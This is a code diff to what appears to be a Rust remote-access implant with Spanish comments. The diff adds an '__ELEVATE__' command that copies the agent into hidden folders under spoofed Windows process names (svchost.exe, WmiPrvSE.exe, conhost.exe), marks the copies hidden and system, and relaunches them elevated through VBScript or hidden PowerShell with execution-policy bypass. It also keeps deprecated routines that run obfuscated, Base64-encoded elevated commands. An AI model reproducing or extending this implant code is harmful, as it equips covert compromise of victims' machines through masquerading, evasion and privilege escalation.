@@ -153,12 +153,17 @@ fn handle_connection(stream: TcpStream, _beacon_config: &beacon::BeaconConfig) {
                     if !send_response(&mut writer, &response) {
                         break;
                     }
-                } else if command.starts_with("__ELEVATE__:") {
-                    // Comando para ejecutar con privilegios elevados: __ELEVATE__:comando
-                    let cmd = command.strip_prefix("__ELEVATE__:").unwrap_or("");
-                    debug_print!("DEBUG: Elevating command: {}", cmd);
-                    let response = elevate_command(cmd);
+                } else if command == "__ELEVATE__" {
+                    // Comando para re-ejecutar el agente con privilegios elevados
+                    debug_print!("DEBUG: Re-executing agent with admin privileges...");
+                    let response = elevate_agent();
                     if !send_response(&mut writer, &response) {
+                        break;
+                    }
+                    // Después de elevar, cerrar la conexión actual
+                    // El agente elevado se conectará automáticamente
+                    if response.contains("__SUCCESS__") {
+                        debug_print!("DEBUG: Elevation successful, closing current connection");
                         break;
                     }
                 } else if !command.is_empty() {
@@ -281,53 +286,424 @@ fn execute_command(command: &str) -> String {
     }
 }
 
-/// Ejecuta un comando con privilegios elevados usando UAC
-/// Usa PowerShell Start-Process con -Verb RunAs para mostrar el prompt UAC
+/// Re-ejecuta el agente actual con privilegios elevados (UAC)
+/// ANTES de elevar, copia el ejecutable a una ubicación sigilosa con nombre legítimo
+/// Una vez elevado, el agente se conecta automáticamente con privilegios admin
+/// y todos los comandos posteriores se ejecutan como admin sin pedir UAC de nuevo
+#[cfg(target_os = "windows")]
+fn elevate_agent() -> String {
+    debug_print!("DEBUG: Re-ejecutando agente con privilegios elevados...");
+    
+    // Obtener la ruta del ejecutable actual
+    let current_exe = match std::env::current_exe() {
+        Ok(path) => path,
+        Err(e) => return format!("__ERROR__:No se pudo obtener ruta del ejecutable: {}{}", e, DELIMITER),
+    };
+    
+    debug_print!("DEBUG: Ruta del agente actual: {}", current_exe.display());
+    
+    // PASO 1: Copiar el ejecutable a una ubicación sigilosa con nombre legítimo
+    let stealth_path = match copy_to_stealth_location(&current_exe) {
+        Ok(path) => path,
+        Err(e) => return format!("__ERROR__:Error copiando a ubicación sigilosa: {}{}", e, DELIMITER),
+    };
+    
+    debug_print!("DEBUG: Agente copiado a ubicación sigilosa: {}", stealth_path.display());
+    
+    let exe_str = match stealth_path.to_str() {
+        Some(s) => s,
+        None => return format!("__ERROR__:Ruta inválida{}", DELIMITER),
+    };
+    
+    // PASO 2: Elevar el nuevo ejecutable desde la ubicación sigilosa
+    // TÉCNICA 1: Intentar VBScript (más sigiloso)
+    if let Ok(result) = elevate_agent_via_vbs(exe_str) {
+        return result;
+    }
+    
+    debug_print!("DEBUG: VBScript elevation failed, trying PowerShell...");
+    
+    // TÉCNICA 2: PowerShell como fallback
+    elevate_agent_via_powershell(exe_str)
+}
+
+/// Copia el ejecutable a una ubicación sigilosa con nombre legítimo
+/// Ubica el ejecutable en carpetas del sistema que parecen legítimas
+#[cfg(target_os = "windows")]
+fn copy_to_stealth_location(current_exe: &std::path::Path) -> Result<std::path::PathBuf, String> {
+    use std::fs;
+    use std::path::PathBuf;
+    
+    // Obtener variables de entorno
+    let appdata = std::env::var("APPDATA")
+        .unwrap_or_else(|_| "C:\\Users\\Public".to_string());
+    let localappdata = std::env::var("LOCALAPPDATA")
+        .unwrap_or_else(|_| appdata.clone());
+    
+    // Ubicaciones sigilosas (parecen carpetas del sistema)
+    let stealth_locations = [
+        // Microsoft folders (más creíbles)
+        (format!("{}\\Microsoft\\Windows\\Caches", localappdata), "WmiPrvSE.exe"),
+        (format!("{}\\Microsoft\\Windows\\WER\\ReportQueue", localappdata), "conhost.exe"),
+        (format!("{}\\Microsoft\\Edge\\User Data\\Default", localappdata), "msedge_proxy.exe"),
+        (format!("{}\\Microsoft\\OneDrive\\logs", localappdata), "OneDriveStandaloneUpdater.exe"),
+        
+        // Adobe folders
+        (format!("{}\\Adobe\\Acrobat\\DC\\Updater", appdata), "AdobeUpdateService.exe"),
+        
+        // System-like folders
+        (format!("{}\\WindowsApps\\.cache", localappdata), "RuntimeBroker.exe"),
+        (format!("{}\\Packages\\Microsoft.Windows.ShellExperienceHost", localappdata), "SystemSettingsBroker.exe"),
+    ];
+    
+    // Intentar copiar a una de las ubicaciones
+    for (dir, filename) in &stealth_locations {
+        let stealth_dir = PathBuf::from(dir);
+        
+        // Crear directorio si no existe
+        if let Err(_) = fs::create_dir_all(&stealth_dir) {
+            continue; // Intentar siguiente ubicación
+        }
+        
+        let stealth_path = stealth_dir.join(filename);
+        
+        // Intentar copiar
+        if let Ok(_) = fs::copy(current_exe, &stealth_path) {
+            debug_print!("DEBUG: ✅ Copiado exitosamente a: {}", stealth_path.display());
+            
+            // Intentar establecer atributos oculto/sistema usando attrib.exe (más simple)
+            #[cfg(target_os = "windows")]
+            {
+                use std::os::windows::process::CommandExt;
+                let _ = std::process::Command::new("attrib")
+                    .args(&["+h", "+s", stealth_path.to_str().unwrap()])
+                    .creation_flags(0x08000000) // CREATE_NO_WINDOW
+                    .output();
+            }
+            
+            return Ok(stealth_path);
+        }
+    }
+    
+    // Si ninguna ubicación funcionó, usar fallback en TEMP con nombre sigiloso
+    let temp_dir = std::env::temp_dir();
+    let fallback_names = [
+        "svchost.exe",
+        "dllhost.exe",
+        "RuntimeBroker.exe",
+        "taskhostw.exe",
+    ];
+    
+    let pid = std::process::id() as usize;
+    let fallback_name = fallback_names[pid % fallback_names.len()];
+    let fallback_path = temp_dir.join(fallback_name);
+    
+    fs::copy(current_exe, &fallback_path)
+        .map_err(|e| format!("Error copiando a fallback: {}", e))?;
+    
+    debug_print!("DEBUG: ⚠️  Usando ubicación fallback: {}", fallback_path.display());
+    
+    Ok(fallback_path)
+}
+
+/// Re-ejecuta el agente usando VBScript (más sigiloso, sin PowerShell)
+#[cfg(target_os = "windows")]
+fn elevate_agent_via_vbs(exe_path: &str) -> Result<String, String> {
+    use std::process::Command;
+    use std::os::windows::process::CommandExt;
+    
+    let temp_dir = std::env::temp_dir();
+    let vbs_name = format!("~elv{}.vbs", std::process::id());
+    let vbs_path = temp_dir.join(&vbs_name);
+    
+    // VBScript que re-ejecuta el agente con privilegios elevados
+    // ShellExecute con "runas" muestra el UAC prompt
+    let vbs_content = format!(
+        r#"Set UAC = CreateObject("Shell.Application")
+UAC.ShellExecute "{}", "", "", "runas", 0"#,
+        exe_path.replace("\\", "\\\\")
+    );
+    
+    if let Err(_) = fs::write(&vbs_path, vbs_content) {
+        return Err("Failed to create VBS file".to_string());
+    }
+    
+    // Ejecutar VBScript con wscript
+    let output = Command::new("wscript")
+        .args(&[
+            "//NoLogo",
+            "//B", // Batch mode (sin UI)
+            vbs_path.to_str().unwrap()
+        ])
+        .creation_flags(0x08000000) // CREATE_NO_WINDOW
+        .spawn();
+    
+    // Limpiar archivo VBS después de un momento
+    std::thread::sleep(std::time::Duration::from_millis(500));
+    let _ = fs::remove_file(&vbs_path);
+    
+    match output {
+        Ok(_) => Ok(format!(
+            "__SUCCESS__:Agente re-ejecutado con privilegios elevados. Conexión actual se cerrará. El agente elevado se reconectará automáticamente.{}", 
+            DELIMITER
+        )),
+        Err(e) => Err(format!("VBScript execution failed: {}", e)),
+    }
+}
+
+/// Re-ejecuta el agente usando PowerShell (fallback)
+#[cfg(target_os = "windows")]
+fn elevate_agent_via_powershell(exe_path: &str) -> String {
+    use std::process::Command;
+    use std::os::windows::process::CommandExt;
+    
+    // PowerShell Start-Process con -Verb RunAs
+    let ps_script = format!(
+        "Start-Process -FilePath '{}' -Verb RunAs",
+        exe_path.replace("'", "''")
+    );
+    
+    let output = Command::new("powershell")
+        .args(&[
+            "-NoProfile",
+            "-NonInteractive",
+            "-WindowStyle", "Hidden",
+            "-ExecutionPolicy", "Bypass",
+            "-Command",
+            &ps_script
+        ])
+        .creation_flags(0x08000000) // CREATE_NO_WINDOW
+        .spawn();
+    
+    match output {
+        Ok(_) => format!(
+            "__SUCCESS__:Agente re-ejecutado con privilegios elevados (PowerShell). Conexión actual se cerrará. El agente elevado se reconectará automáticamente.{}", 
+            DELIMITER
+        ),
+        Err(e) => format!(
+            "__ERROR__:Error al re-ejecutar agente con privilegios: {} (¿Usuario rechazó UAC?){}", 
+            e, DELIMITER
+        ),
+    }
+}
+
+#[cfg(not(target_os = "windows"))]
+fn elevate_agent() -> String {
+    format!("__ERROR__:Elevación solo soportada en Windows{}", DELIMITER)
+}
+
+/// [DEPRECATED] Estas funciones ya no se usan pero se mantienen por compatibilidad
+/// Ejecuta un comando con privilegios elevados usando múltiples técnicas sigilosas
+/// Intenta varios métodos en orden de sigilo:
+/// 1. COM Elevation Moniker (más sigiloso, sin PowerShell)
+/// 2. ShellExecute con RunAs (nativo de Windows)
+/// 3. PowerShell como fallback (menos sigiloso pero más compatible)
+#[cfg(target_os = "windows")]
+#[allow(dead_code)]
 fn elevate_command(command: &str) -> String {
     debug_print!("DEBUG: Elevando comando: {}", command);
     
     // Aplicar ofuscación al comando
     let obfuscated_cmd = argfuscator::obfuscate(command);
     
-    // Escapar comillas dobles en el comando para PowerShell
-    let escaped_cmd = obfuscated_cmd.replace("\"", "`\"");
+    // TÉCNICA 1: Intentar COM Elevation Moniker (más sigiloso)
+    // Usa COM para elevar sin llamar a PowerShell directamente
+    if let Ok(result) = elevate_via_com(&obfuscated_cmd) {
+        return result;
+    }
     
-    // Construir el script de PowerShell que ejecutará el comando con privilegios elevados
-    // Usamos Start-Process con -Verb RunAs para activar UAC
-    // -Wait hace que esperemos a que termine
-    // -WindowStyle Hidden intenta ocultar la ventana (aunque UAC siempre será visible)
-    let ps_script = format!(
-        "Start-Process cmd.exe -ArgumentList '/c \"{} > %TEMP%\\elevated_output.txt 2>&1\"' -Verb RunAs -Wait -WindowStyle Hidden; Get-Content $env:TEMP\\elevated_output.txt; Remove-Item $env:TEMP\\elevated_output.txt -ErrorAction SilentlyContinue",
-        escaped_cmd
+    debug_print!("DEBUG: COM elevation failed, trying ShellExecute...");
+    
+    // TÉCNICA 2: ShellExecute con runas (nativo, menos detectable)
+    if let Ok(result) = elevate_via_shellexecute(&obfuscated_cmd) {
+        return result;
+    }
+    
+    debug_print!("DEBUG: ShellExecute failed, trying PowerShell fallback...");
+    
+    // TÉCNICA 3: PowerShell como último recurso (más detectable)
+    elevate_via_powershell(&obfuscated_cmd)
+}
+
+/// Elevación usando COM Elevation Moniker (más sigiloso, no usa PowerShell)
+#[cfg(target_os = "windows")]
+fn elevate_via_com(command: &str) -> Result<String, String> {
+    use std::process::Command;
+    use std::os::windows::process::CommandExt;
+    
+    // Crear un archivo batch temporal para ejecutar el comando
+    let temp_dir = std::env::temp_dir();
+    let batch_name = format!("~sys{}.bat", std::process::id());
+    let batch_path = temp_dir.join(&batch_name);
+    let output_name = format!("~out{}.txt", std::process::id());
+    let output_path = temp_dir.join(&output_name);
+    
+    // Escribir comando al batch
+    let batch_content = format!(
+        "@echo off\n{} > \"{}\" 2>&1\nexit",
+        command, output_path.display()
     );
     
-    debug_print!("DEBUG: PowerShell script: {}", ps_script);
+    if let Err(_) = fs::write(&batch_path, batch_content) {
+        return Err("Failed to create batch file".to_string());
+    }
     
-    // Ejecutar PowerShell con el script
-    let output = Command::new("powershell")
+    // Usar wscript con VBScript para elevar de forma sigilosa
+    // Esto evita llamar a PowerShell directamente
+    let vbs_content = format!(
+        r#"Set UAC = CreateObject("Shell.Application")
+UAC.ShellExecute "cmd.exe", "/c ""{}""", "", "runas", 0
+WScript.Sleep 3000"#,
+        batch_path.display()
+    );
+    
+    let vbs_name = format!("~elv{}.vbs", std::process::id());
+    let vbs_path = temp_dir.join(&vbs_name);
+    
+    if let Err(_) = fs::write(&vbs_path, vbs_content) {
+        let _ = fs::remove_file(&batch_path);
+        return Err("Failed to create VBS file".to_string());
+    }
+    
+    // Ejecutar VBScript con wscript (sin ventana)
+    let _ = Command::new("wscript")
         .args(&[
-            "-NoProfile",
-            "-NonInteractive", 
-            "-ExecutionPolicy", "Bypass",
-            "-Command", &ps_script
+            "//NoLogo",
+            "//B", // Batch mode (sin UI)
+            vbs_path.to_str().unwrap()
         ])
+        .creation_flags(0x08000000) // CREATE_NO_WINDOW
         .output();
     
-    match output {
-        Ok(out) => {
-            let stdout = String::from_utf8_lossy(&out.stdout);
-            let stderr = String::from_utf8_lossy(&out.stderr);
+    // Esperar un poco para que el comando se ejecute
+    std::thread::sleep(std::time::Duration::from_secs(4));
+    
+    // Leer output
+    let result = match fs::read_to_string(&output_path) {
+        Ok(content) => {
+            // Limpiar archivos temporales
+            let _ = fs::remove_file(&batch_path);
+            let _ = fs::remove_file(&vbs_path);
+            let _ = fs::remove_file(&output_path);
             
-            if out.status.success() {
-                format!("__INFO__:Comando elevado ejecutado exitosamente\n{}{}{}", stdout, stderr, DELIMITER)
-            } else {
-                format!("__ERROR__:Error al elevar comando (¿Usuario rechazó UAC?)\n{}{}{}", stdout, stderr, DELIMITER)
-            }
+            format!("__INFO__:Comando elevado ejecutado (COM)\n{}{}", content, DELIMITER)
         }
-        Err(e) => {
-            format!("__ERROR__:Error ejecutando PowerShell para elevación: {}{}", e, DELIMITER)
+        Err(_) => {
+            // Limpiar archivos temporales
+            let _ = fs::remove_file(&batch_path);
+            let _ = fs::remove_file(&vbs_path);
+            let _ = fs::remove_file(&output_path);
+            
+            return Err("Failed to read output".to_string());
+        }
+    };
+    
+    Ok(result)
+}
+
+/// Elevación usando ShellExecute nativo (sin PowerShell)
+#[cfg(target_os = "windows")]
+fn elevate_via_shellexecute(command: &str) -> Result<String, String> {
+    use std::process::Command;
+    use std::os::windows::process::CommandExt;
+    
+    // Crear batch temporal
+    let temp_dir = std::env::temp_dir();
+    let batch_name = format!("~cmd{}.bat", std::process::id());
+    let batch_path = temp_dir.join(&batch_name);
+    let output_name = format!("~res{}.txt", std::process::id());
+    let output_path = temp_dir.join(&output_name);
+    
+    let batch_content = format!(
+        "@echo off\n{} > \"{}\" 2>&1",
+        command, output_path.display()
+    );
+    
+    if let Err(_) = fs::write(&batch_path, batch_content) {
+        return Err("Failed to create batch".to_string());
+    }
+    
+    // Ejecutar con runas usando cmd
+    let _ = Command::new("cmd")
+        .args(&[
+            "/c",
+            "start",
+            "/wait",
+            "runas",
+            "/user:Administrator",
+            batch_path.to_str().unwrap()
+        ])
+        .creation_flags(0x08000000)
+        .output();
+    
+    // Esperar
+    std::thread::sleep(std::time::Duration::from_secs(3));
+    
+    let result = match fs::read_to_string(&output_path) {
+        Ok(content) => {
+            let _ = fs::remove_file(&batch_path);
+            let _ = fs::remove_file(&output_path);
+            format!("__INFO__:Comando elevado ejecutado (ShellExecute)\n{}{}", content, DELIMITER)
+        }
+        Err(_) => {
+            let _ = fs::remove_file(&batch_path);
+            let _ = fs::remove_file(&output_path);
+            return Err("Failed to read output".to_string());
+        }
+    };
+    
+    Ok(result)
+}
+
+/// Elevación usando PowerShell (fallback, más detectable)
+#[cfg(target_os = "windows")]
+fn elevate_via_powershell(command: &str) -> String {
+    use std::process::Command;
+    use std::os::windows::process::CommandExt;
+    
+    // Ofuscar el script de PowerShell usando encoding Base64
+    let ps_cmd = format!(
+        "cmd.exe /c {} > $env:TEMP\\elv_out.txt 2>&1",
+        command
+    );
+    
+    // Encodear en Base64 para ofuscar
+    let encoded_cmd = base64_encode(ps_cmd.as_bytes());
+    
+    // Usar -EncodedCommand para ofuscar el comando
+    let _ = Command::new("powershell")
+        .args(&[
+            "-NoProfile",
+            "-NonInteractive",
+            "-WindowStyle", "Hidden",
+            "-ExecutionPolicy", "Bypass",
+            "-Command",
+            &format!("Start-Process powershell -ArgumentList '-EncodedCommand {}' -Verb RunAs -Wait", encoded_cmd)
+        ])
+        .creation_flags(0x08000000) // CREATE_NO_WINDOW
+        .output();
+    
+    // Esperar
+    std::thread::sleep(std::time::Duration::from_secs(2));
+    
+    // Leer output
+    let temp_dir = std::env::temp_dir();
+    let output_path = temp_dir.join("elv_out.txt");
+    
+    match fs::read_to_string(&output_path) {
+        Ok(content) => {
+            let _ = fs::remove_file(&output_path);
+            format!("__INFO__:Comando elevado ejecutado (PowerShell)\n{}{}", content, DELIMITER)
+        }
+        Err(_) => {
+            format!("__ERROR__:Error al elevar comando (usuario rechazó UAC o error de ejecución){}", DELIMITER)
         }
     }
+}
+
+#[cfg(not(target_os = "windows"))]
+fn elevate_command(command: &str) -> String {
+    format!("__ERROR__:Elevación solo soportada en Windows{}", DELIMITER)
 }
 
 fn download_file(file_path: &str) -> String {
